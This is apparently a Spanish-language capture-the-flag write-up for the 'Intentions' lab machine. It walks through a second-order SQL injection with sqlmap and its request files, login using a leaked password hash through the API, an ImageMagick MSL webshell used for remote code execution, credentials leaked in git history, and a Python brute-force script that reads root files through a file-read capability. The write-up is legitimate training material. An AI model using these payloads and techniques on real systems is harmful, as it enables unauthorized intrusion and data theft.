------
- Tags: #sqli #sqlmap #api #API-Enumeration #image-magick #git #python-scripting #md5sum #seasson2 
--------
## Técnicas utilizadas
- SQL injection [sqlmap --second-req]
- Abusing the api
- ImageMagick [VID Scheme]
- information leakage from commits[git]
- Abusing custom script [python scripting]
## Procedimiento
![[Pasted image 20230701124627.png]]

#### Reconocimiento
Si lanzamos un **nmap** podemos descubrir los siguientes puertos abiertos:
```ruby
# nmap -sCV -p22,80 10.129.21.83 -oN Ports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-01 12:43 MST
Nmap scan report for 10.129.21.83
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 47d20066275ee69c808903b58f9e60e5 (ECDSA)
|_  256 c8d0ac8d299b87405f1bb0a41d538ff1 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Intentions
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.65 seconds
```

Un escaneo con **whatweb** nos permite ver las siguientes tecnologías web:
```ruby
# whatweb 10.129.21.83
http://10.129.21.83 [200 OK] Cookies[XSRF-TOKEN,intentions_session], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[intentions_session], IP[10.129.21.83], Script, Title[Intentions], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-XSS-Protection[1; mode=block], nginx[1.18.0]
```

-------
#### SQL injection [sqlmap --second-req]
Si visitamos la pagina, nos encontramos con un **login**. Tenemos la opcion de registrarnos o de iniciar sesión:
![[login.png]]

Podemos intentar algunas de las inyecciones basicas de sql pero no funcionaran. Si registramos una cuenta, nos encontramos el siguiente **dashboard**:
![[dashboard_user.png]]

En la sección de **Your feed** se muestran los intereses que definiamos nosotros en el apartado de **Favorite Genres**:
![[genres_input.png]]

Y en **Your feed** se ve reflejado:
![[your_feed.png]]

Podemos intentar algunas inyecciones basicas en el campo de **Genres** y podemos observar que hay una que especialmente parece funcionar:
![[genres_input_sqli.png]]

Y como resultado, en **Your Feed** vemos que se nos muestran todos los otros resultado incluyendo las comidas:
![[your_feed_sqli.png]]

Bien, pues si seguimos intentando inyecciones, vemos que no podemos obtener más nada. Podemos ponernos a pensar que puede estar pasando por detras, cuando intentamos la inyección y recargamos la pagina, observamos que nuestro **input** no contiene espacios, esto es porque el sevidor quizás los ha borrado:
![[Pasted image 20230705215724.png]]

Sin embargo, hay maneras de burlar este tipo de "restricciones", en mi caso usare **sqlmap** para automatizar la extracción de informacion, además haremos uso de un **tamper** de **sqlmap** que nos elimina los espacios y nos agrega comantarios **SQL**, la inyección principal se veria asi:
```
food')/* comment */&&/* comment */1/* comment */#;
```

Procederemos a crear un archivo que contendra las dos peticiones. Una con la inyección y otra que consultara la pagina en busca del comportamiendo adecuado:

**req.txt**:
```bupsuite
POST /api/v1/gallery/user/genres HTTP/1.1
Host: 10.10.11.220
Content-Length: 25
Accept: application/json, text/plain, */*
X-XSRF-TOKEN: eyJpdiI6IkJreFBoYmQycTRjNHVObTdjb3FKSWc9PSIsInZhbHVlIjoibGJHOUVjU2d4a2lvUjlvWVVuUUxzWjk0QXpQUWVmSkdSbFp4SHBpTDVuRkppdVdJeDRpc3Y2YS9lTTZPM0VTV3pqWXN3M2lGenYvcTMzV2drNVdDOHYwZzdlUGlUcnExcVRmRWRSeVdmRXg5Q2ZrV0s1TWtZSHQvSE1BajJoMDMiLCJtYWMiOiI1NzNkNTM0MzNlYjE0ZjgyMjFhZmI2MDJlY2NkYTA1YjAzYmI3ZmVmYTQ0YWQwMGVhZDIzNzI0YmE2MTM2YjllIiwidGFnIjoiIn0=
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Content-Type: application/json
Origin: http://10.10.11.220
Referer: http://10.20.11.220/gallery
Accept-Encoding: gzip, deflate
Accept-Language: es-419,es;q=0.9
Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTI5LjE5LjEwMS9hcGkvdjEvYXV0aC9sb2dpbiIsImlhdCI6MTY4ODQwNjc5MiwiZXhwIjoxNjg4NDI4MzkyLCJuYmYiOjE2ODg0MDY3OTIsImp0aSI6IlN3YmlTcWtIMExzRDB1RWYiLCJzdWIiOiIyOCIsInBydiI6IjIzYmQ1Yzg5NDlmNjAwYWRiMzllNzAxYzQwMDg3MmRiN2E1OTc2ZjcifQ.IYAi78SI15qVBCYoGfBC6xwvFKAkT9Pr0SR6YyzQnT0; XSRF-TOKEN=eyJpdiI6IkJreFBoYmQycTRjNHVObTdjb3FKSWc9PSIsInZhbHVlIjoibGJHOUVjU2d4a2lvUjlvWVVuUUxzWjk0QXpQUWVmSkdSbFp4SHBpTDVuRkppdVdJeDRpc3Y2YS9lTTZPM0VTV3pqWXN3M2lGenYvcTMzV2drNVdDOHYwZzdlUGlUcnExcVRmRWRSeVdmRXg5Q2ZrV0s1TWtZSHQvSE1BajJoMDMiLCJtYWMiOiI1NzNkNTM0MzNlYjE0ZjgyMjFhZmI2MDJlY2NkYTA1YjAzYmI3ZmVmYTQ0YWQwMGVhZDIzNzI0YmE2MTM2YjllIiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6ImVxajFaWXVMQ2QxSjE2MHVxTW5kZkE9PSIsInZhbHVlIjoiWXZ6SmhkcUc1T3pqTG1pOVg4OG9wcEpxUCtPYlZNS09iUXE1ditMTGg2dlRLU0R2eUgvV3ZNRloxVW1UQjJvUkNmRHZrVHV3V1Z6bjluL0ZyQlVkNmVVclV0cE9QTlF3VEV0bXpacXA0VFhMakRueWlyOXNaYU51QjloYzZSVmEiLCJtYWMiOiI4YzA3YTQ1MTRhMjdkNmQxZDMxZjQ5MmZiYTE4MmEyNzAwMWM1NTdjYTRhMDE1ZmY0MmUxN2YyOWExNzFjNzg2IiwidGFnIjoiIn0%3D
Connection: close

{"genres":"food*#;"}
```

**req2.txt**
```
GET /api/v1/gallery/user/feed HTTP/1.1
Host: 10.10.11.220
Accept: application/json, text/plain, */*
X-XSRF-TOKEN: eyJpdiI6IkduN1hxT3hsYy92dnJDbUNpTWtwZXc9PSIsInZhbHVlIjoiK0l1UXpFa2w4L2wvNFJlV0lmS2I5UHUzTVI3TS9JTGFZWVRiaHYvcGNCaytCcXZMYng2dE9HbE9oRERZQ3FzMEMrdDdWVENIbUc1NW5qeHNHYlRSOFpPQzlLczIrTStWbXF6TytCWnRpc005QzdmbE54Wk1HemhHT0VHWXBwOHkiLCJtYWMiOiI5YzNlZjg3YjE1NzMzMDk0ODFjZThiYjAxMzc2Yjk0NDE5NDEyNDgyNGE2YzZmNTE0OGQyZDc5NWI5NmZjOWE5IiwidGFnIjoiIn0=
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Referer: http://10.10.11.220/gallery
Accept-Encoding: gzip, deflate
Accept-Language: es-419,es;q=0.9
Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTI5LjE5LjEwMS9hcGkvdjEvYXV0aC9sb2dpbiIsImlhdCI6MTY4ODQwNjc5MiwiZXhwIjoxNjg4NDI4MzkyLCJuYmYiOjE2ODg0MDY3OTIsImp0aSI6IlN3YmlTcWtIMExzRDB1RWYiLCJzdWIiOiIyOCIsInBydiI6IjIzYmQ1Yzg5NDlmNjAwYWRiMzllNzAxYzQwMDg3MmRiN2E1OTc2ZjcifQ.IYAi78SI15qVBCYoGfBC6xwvFKAkT9Pr0SR6YyzQnT0; XSRF-TOKEN=eyJpdiI6IkduN1hxT3hsYy92dnJDbUNpTWtwZXc9PSIsInZhbHVlIjoiK0l1UXpFa2w4L2wvNFJlV0lmS2I5UHUzTVI3TS9JTGFZWVRiaHYvcGNCaytCcXZMYng2dE9HbE9oRERZQ3FzMEMrdDdWVENIbUc1NW5qeHNHYlRSOFpPQzlLczIrTStWbXF6TytCWnRpc005QzdmbE54Wk1HemhHT0VHWXBwOHkiLCJtYWMiOiI5YzNlZjg3YjE1NzMzMDk0ODFjZThiYjAxMzc2Yjk0NDE5NDEyNDgyNGE2YzZmNTE0OGQyZDc5NWI5NmZjOWE5IiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6Im9BVUd6QnRUWCtlK1R5dUVEK0RWQ1E9PSIsInZhbHVlIjoiQURhMmNaZkc1b3JrVzFtQVM4d1o4UndFZWN5Y0F5M0Y4RDhMMW1zQ0JBQm9taXc3OS9Gb3UvL20vZm5Eeko0c1JLTU0xcHAvTVNLUVNTQzdBRy9EYko3bUNJTVd2alFZT3dYdkNjelNDNHRiSDJMZ3pXcEVGUFFaNVhUb2VlQmwiLCJtYWMiOiIxMzU1ZTM0ZTkyZDE5MmU0ZTFiOTg4MDY1NGY2OWU3MjNmMWU2ZmY5NTJiYjU2MTllMjk1OWQwMmI0NDgyMTE5IiwidGFnIjoiIn0%3D
Connection: close
```

El comando con **sqlmap** se vera de la siguiente manera:
```
# sqlmap -r req.txt --second-req req2.txt --batch --level=5 --risk=3 --tamper=space2comment.py
```

Si nos podemos a enumerar las bases de datos, podemos dar con unos hashes que nos servirar para ingresar como un usuario privilegiado a la pagina:
![[hashes.png]]

-----
#### Abusing the api
Si bien los hashes proporcionados no se pueden romperer ( Son **bcrypt** y demoran una eternidad, además de que la contraseña no se encuentra en ningun diccionario ) podemos utilizarlos para loguearnos como el usuario **greg**.

Enumerando la api, encontramos una funcionalidad nueva en la **V2**, esta nos permite ingresar con el **correo** y con el hash correspondiente del **usuario**:
![[login_with_hash.png]]

---------
#### ImageMagick [VID Scheme]
Ahora que tenemos un usuario con privilegios de administrador, podemos ir a la ruta */admin/* y visualizar el dashboard. En este, hay una aviso que nos cuenta que se esta implementando **ImageMagick**:
![[image_magick_info.png]]

Ademas, podemos observar que tenemos una sección donde podemos aplicarle algunos filtros a las imagenes del servidor:
![[edit_pics.png]]

Sabiendo que por detras esta **ImageMagick** y hay un apartado que  hace funcion de este podemos buscar algun tipo de vulnerabilidad.
Si hacemos una busqueda rapida por google por **php imagemagick rce** vemos el siguiente [resultado](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) que llama la atención:
![[CVE.png]]

En este nos cuentan ciertas formas de explotar **ImageMagick** pero hay uno en particular que vamos a estar utilizando, este consiste en crear un archivo **.msl** que se subira a la web y contendra un codigo que nos creara una webshell en la ruta indicada, cabe mencionar que habran algunos parametros que cambiaran y algunos atributos nuevos se incluiran:
![[RCE_part1.png]]

Y en el cotenido pondremos lo siguiente:
![[RCE_part2.png]]

Una vez hecho esto, si verificamos la existencia del archivo nos encontramos con lo siguiente:
![[RCE_part3.png]]

Y solo es cuestion de realizar una petición con curl para poder ejecutar comandos de manera remota:
```ruby
# curl -s -X GET http://10.10.11.220/hola.php?a=system("whaomi")
caption: www-dataCAPTION 120x120 120x120+0+0 16-bit sRGB 2.080u 0:02.171
```

------
#### information leakage from commits[git]
Una vez como **www-data** podemos observar que dentro de los archivos de la web hay un **.git**. Si intetamos hacer un **git log** vemos que no tenemos la capacidad de listarlos. Podemos transferirnos toda la carpeta e intentar hacerlo desde nuestra maquina localmente. Antes de transferirla, tenemos que ir a una carpeta con permisos de escritura y crear un comprimido de la carpeta web ( utilizando **tar** ).
Dentro de los logs, podemos ver uno que contienes credenciales para el usuario **greg**:
![[password_leak.png]]

Podemos intentar conectarnos ahora como el usuario **greg** por ssh y visualizar la flag:
![[user_flag.png]]

-------
#### Abusing custom script [python scripting]
Dentro de la carpeta personal de **greg** podemos ver 2 archivos, uno de ellos hace uso de una herramienta de nombre **scanner** y otro simplemente es una lista de **md5 hashes**.

Enumerando la aplicacion vemos algunas caracteristicas algo peculiares, caracteristicas de las cuales nos podemos apoyar para aplicar fuerza bruta e ir extrayendo informacion de ficheros dado que el script cuenta con la capability **cap_dac_read_search=ep**  que nos permite leer cualquier archivo del sistema:
![[capability.png]]

Procedemos a montarnos un script en **python3** para automatizar la extracción de informacion de archivos:
```python
#!/usr/bin/env python

import subprocess
import string
import pdb

characters = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
text = ""

for i in range(1, 50):
    for character in characters:
        comando = '/opt/scanner/scanner -c /root/root.txt -s $(echo -n "%s%s" | md5sum | tr -d \' -\') -p -l %d' % (text,character,i)
        salida = subprocess.check_output(comando, shell=True, text=True)
        
       
        if 'matches' in salida:
            text += character
            break

print(text)
```

Y podemos visualizar la flag de **root**:
![[root_flag.png]]
